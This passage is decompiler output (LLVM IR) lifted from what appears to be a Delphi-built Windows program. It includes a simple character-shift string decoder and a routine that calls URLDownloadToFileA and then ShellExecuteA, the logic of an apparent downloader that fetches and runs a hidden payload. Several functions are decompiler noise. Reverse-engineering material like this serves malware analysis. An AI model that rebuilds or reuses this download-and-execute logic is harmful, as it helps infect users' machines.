  %2 = inttoptr i32 %0 to i32*, !insn.addr !1166
  store i32 %1, i32* %2, align 4, !insn.addr !1166
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1167
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1167
  %7 = add i8 %4, %6, !insn.addr !1167
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1167
  store i8 %7, i8* %8, align 1, !insn.addr !1167
  %9 = load i32, i32* %eax, align 4, !insn.addr !1168
  ret i32 %9, !insn.addr !1168
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1169
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1169
  store i8 %4, i8* %5, align 1, !insn.addr !1169
  %6 = mul i32 %0, 4096, !insn.addr !1170
  %7 = udiv i32 %0, 1048576, !insn.addr !1170
  %8 = or i32 %7, %6, !insn.addr !1170
  %9 = and i32 %0, 1048576, !insn.addr !1170
  %10 = icmp eq i32 %9, 0, !insn.addr !1170
  %11 = load i32, i32* %edx, align 4, !insn.addr !1171
  %12 = trunc i32 %11 to i16, !insn.addr !1171
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1171
  %14 = sext i8 %13 to i32, !insn.addr !1171
  %15 = or i32 %2, %14, !insn.addr !1171
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1172
  %17 = and i32 %15, -256, !insn.addr !1172
  %18 = or i32 %17, %16, !insn.addr !1172
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1173
  %20 = load i8, i8* %19, align 1, !insn.addr !1173
  %21 = mul i8 %20, 2, !insn.addr !1173
  %22 = lshr i8 %20, 7, !insn.addr !1173
  %23 = or i8 %22, %21, !insn.addr !1173
  store i8 %23, i8* %19, align 1, !insn.addr !1173
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1174
  %26 = udiv i32 %1, 256, !insn.addr !1174
  %27 = trunc i32 %26 to i8, !insn.addr !1174
  %28 = add i8 %25, %27, !insn.addr !1174
  %29 = load i32, i32* %edx, align 4, !insn.addr !1174
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1174
  store i8 %28, i8* %30, align 1, !insn.addr !1174
  %31 = add i32 %8, -4, !insn.addr !1175
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1175
  store i32 4218448, i32* %32, align 4, !insn.addr !1175
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1176
  %34 = sext i1 %33 to i32, !insn.addr !1176
  ret i32 %34, !insn.addr !1177
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1178
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1178
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1178
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1179
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1180
  %3 = add i32 %2, 1, !insn.addr !1180
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1180
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1181
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1182
  ret i32 0, !insn.addr !1183
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1184
  ret i32 %0, !insn.addr !1184
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1185
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1186
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1187
  %2 = add i32 %1, -1, !insn.addr !1187
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1187
  ret i32 %0, !insn.addr !1188
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1189
  %0 = call i32 @function_40603c(), !insn.addr !1190
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1191
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1192
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1192

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1193
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1194
  %5 = load i32, i32* %4, align 4, !insn.addr !1194
  %6 = icmp eq i32 %5, 0, !insn.addr !1194
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1195
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1195

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1196
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1197
  unreachable, !insn.addr !1197

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1198
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1199
  %1 = icmp eq i32 %0, 0, !insn.addr !1199
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1200

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1201
  br label %dec_label_pc_40601a, !insn.addr !1201

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1202
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1203
  %5 = load i32, i32* %4, align 4, !insn.addr !1203
  %6 = mul i32 %5, 1000, !insn.addr !1203
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1204
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1205
  ret i32 %7, !insn.addr !1206
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1207
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1207
  %1 = icmp eq i32 %0, 0, !insn.addr !1207
  store i32 %0, i32* %.reg2mem, !insn.addr !1208
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1208

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1208
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1208
  br label %dec_label_pc_406045, !insn.addr !1208

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1209
  ret i32 %.reload, !insn.addr !1210
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1211
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1212
  ret i32 %1, !insn.addr !1213
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1214
  %1 = icmp eq i32 %0, 0, !insn.addr !1214
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1215

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1216
  br label %dec_label_pc_406076, !insn.addr !1216

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1217
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1218
  ret i32 %3, !insn.addr !1219
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1220
  ret i32 %0, !insn.addr !1221
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1222
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1222
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1222
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1223
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1224
  %3 = add i32 %2, 1, !insn.addr !1224
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1224
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1225
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1226
  ret i32 0, !insn.addr !1227
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1228
  ret i32 %0, !insn.addr !1228
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1229
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1230
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1231
  %2 = add i32 %1, -1, !insn.addr !1231
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1231
  ret i32 %0, !insn.addr !1232
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1233
  ret i32 %0, !insn.addr !1233
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1234
  %ebx.0.reg2mem = alloca i32, !insn.addr !1234
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1235
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1236
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1236
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1236
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1237
  %4 = call i32 @function_4034c8(), !insn.addr !1238
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1239
  %6 = call i32 @function_4034c8(), !insn.addr !1240
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1241
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1241
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1241

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1242
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1242
  %11 = load i8, i8* %10, align 1, !insn.addr !1242
  %12 = icmp eq i8 %11, 61, !insn.addr !1242
  %13 = icmp eq i1 %12, false, !insn.addr !1243
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1243

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1244
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1244
  store i8 46, i8* %16, align 1, !insn.addr !1244
  br label %dec_label_pc_406162, !insn.addr !1245

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1246
  %18 = add i8 %17, -1, !insn.addr !1247
  %19 = add i32 %14, %8, !insn.addr !1248
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1248
  store i8 %18, i8* %20, align 1, !insn.addr !1248
  br label %dec_label_pc_406162, !insn.addr !1248

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1249
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1250
  %23 = icmp eq i32 %22, 0, !insn.addr !1250
  %24 = icmp eq i1 %23, false, !insn.addr !1251
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1251
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1251
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1251

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1252
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1253
  %26 = call i32 @"@LStrClr"(), !insn.addr !1254
  ret i32 %26, !insn.addr !1255
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1256
  ret i32 %0, !insn.addr !1256
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1257
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1258
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1259
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1260
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1261
  ret i32 %4, !insn.addr !1262
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1263
  %esp.0.reg2mem = alloca i32, !insn.addr !1263
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1263
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1264
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1264
  br label %dec_label_pc_4061cc, !insn.addr !1264

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1265
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1265
  store i32 0, i32* %2, align 4, !insn.addr !1265
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1266
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1266
  store i32 0, i32* %4, align 4, !insn.addr !1266
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1267
  %6 = icmp eq i32 %5, 0, !insn.addr !1267
  %7 = icmp eq i1 %6, false, !insn.addr !1268
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1268
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1268
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1268

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1269
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1269
  store i32 0, i32* %9, align 4, !insn.addr !1269
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1270
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1270
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1271
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1271
  store i32 %0, i32* %13, align 4, !insn.addr !1271
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1272
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1272
  store i32 4219659, i32* %15, align 4, !insn.addr !1272
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1273
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1273
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1273
  store i32 %16, i32* %18, align 4, !insn.addr !1273
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1274
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1275
  %20 = call i32 @function_4060f0(), !insn.addr !1276
  %21 = call i32 @function_4036c8(), !insn.addr !1277
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1278
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1279
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1279
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1279
  store i32 %25, i32* %24, align 4, !insn.addr !1279
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1280
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1281
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1282
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1282
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1282
  store i32 %30, i32* %29, align 4, !insn.addr !1282
  %31 = call i32 @function_4034c8(), !insn.addr !1283
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1284
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1285
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1285
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1285
  %35 = call i32 @function_40618c(), !insn.addr !1286
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1287
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1287
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1288
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1288
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1288
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1289
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1289
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1289
  store i32 %40, i32* %42, align 4, !insn.addr !1289
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1290
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1291
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1291
  store i32 0, i32* %45, align 4, !insn.addr !1291
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1292
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1292
  store i32 0, i32* %47, align 4, !insn.addr !1292
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1293
  %49 = call i32 @function_4036c8(), !insn.addr !1294
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1295
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1295
  store i32 %49, i32* %51, align 4, !insn.addr !1295
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1296
  %53 = call i32 @function_4060f0(), !insn.addr !1297
  %54 = call i32 @function_4036c8(), !insn.addr !1298
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1299
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1299
  store i32 %54, i32* %56, align 4, !insn.addr !1299
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1300
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1300
  store i32 0, i32* %58, align 4, !insn.addr !1300
  %59 = call i32 @function_4060e8(), !insn.addr !1301
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1302
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1302
  store i32 1, i32* %61, align 4, !insn.addr !1302
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1303
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1303
  store i32 0, i32* %63, align 4, !insn.addr !1303
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1304
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1304
  store i32 0, i32* %65, align 4, !insn.addr !1304
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1305
  %67 = call i32 @function_4036c8(), !insn.addr !1306
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1307
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1307
  store i32 %67, i32* %69, align 4, !insn.addr !1307
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1308
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1308
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1308
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1309
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1309
  store i32 0, i32* %73, align 4, !insn.addr !1309
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1310
  %75 = load i32, i32* %73, align 4, !insn.addr !1311
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1312
  store i32 4219666, i32* %69, align 4, !insn.addr !1313
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1314
  ret i32 %76, !insn.addr !1315
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1316
  ret i32 %0, !insn.addr !1316
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1317
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1318
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1319
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1319
  %ecx.0.reg2mem = alloca i32, !insn.addr !1319
  %esp.0.reg2mem = alloca i32, !insn.addr !1319
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1319
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1319
  store i32 %5, i32* %6, align 4, !insn.addr !1319
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1320
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1320
  %11 = add i8 %8, %10, !insn.addr !1320
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1320
  store i8 %11, i8* %12, align 1, !insn.addr !1320
  %13 = add i32 %2, 58, !insn.addr !1321
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1321
  %15 = load i8, i8* %14, align 1, !insn.addr !1321
  %16 = load i32, i32* %eax, align 4, !insn.addr !1321
  %17 = udiv i32 %16, 256, !insn.addr !1321
  %18 = trunc i32 %17 to i8, !insn.addr !1321
  %19 = add i8 %15, %18, !insn.addr !1321
  store i8 %19, i8* %14, align 1, !insn.addr !1321
  %20 = add i32 %0, 112, !insn.addr !1322
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1322
  %22 = load i8, i8* %21, align 1, !insn.addr !1322
  %23 = trunc i32 %4 to i8, !insn.addr !1322
  %24 = add i8 %22, %23, !insn.addr !1322
  store i8 %24, i8* %21, align 1, !insn.addr !1322
  %25 = trunc i32 %3 to i16, !insn.addr !1323
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1323
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1323
  %27 = load i8, i8* %7, align 4, !insn.addr !1324
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1324
  %30 = add i8 %27, %29, !insn.addr !1324
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1324
  store i8 %30, i8* %31, align 1, !insn.addr !1324
  %32 = load i8, i8* %7, align 4, !insn.addr !1325
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1325
  %35 = add i8 %32, %34, !insn.addr !1325
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1325
  store i8 %35, i8* %36, align 1, !insn.addr !1325
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1326
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1327
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1327
  br label %dec_label_pc_406350, !insn.addr !1327

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1328
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1328
  store i32 0, i32* %39, align 4, !insn.addr !1328
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1329
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1329
  store i32 0, i32* %41, align 4, !insn.addr !1329
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1330
  %43 = icmp eq i32 %42, 0, !insn.addr !1330
  %44 = icmp eq i1 %43, false, !insn.addr !1331
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1331
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1331
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1331

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1332
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1332
  store i32 0, i32* %46, align 4, !insn.addr !1332
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1333
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1333
  store i32 %37, i32* %48, align 4, !insn.addr !1333
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1334
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1334
  store i32 4220396, i32* %50, align 4, !insn.addr !1334
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1335
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1335
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1335
  store i32 %51, i32* %53, align 4, !insn.addr !1335
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1336
  %54 = call i32 @"@LStrPos"(), !insn.addr !1337
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1338
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1338
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1338
  store i32 %57, i32* %56, align 4, !insn.addr !1338
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1339
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1340
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1340
  store i32 %61, i32* %60, align 4, !insn.addr !1340
  %62 = call i32 @function_4034c8(), !insn.addr !1341
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1342
  %64 = add i32 %arg1, -1, !insn.addr !1343
  store i32 %64, i32* %eax, align 4, !insn.addr !1343
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_4065d1 [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406509
    i32 2, label %dec_label_pc_406577
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1344
  %66 = icmp slt i32 %65, 5, !insn.addr !1345
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1345
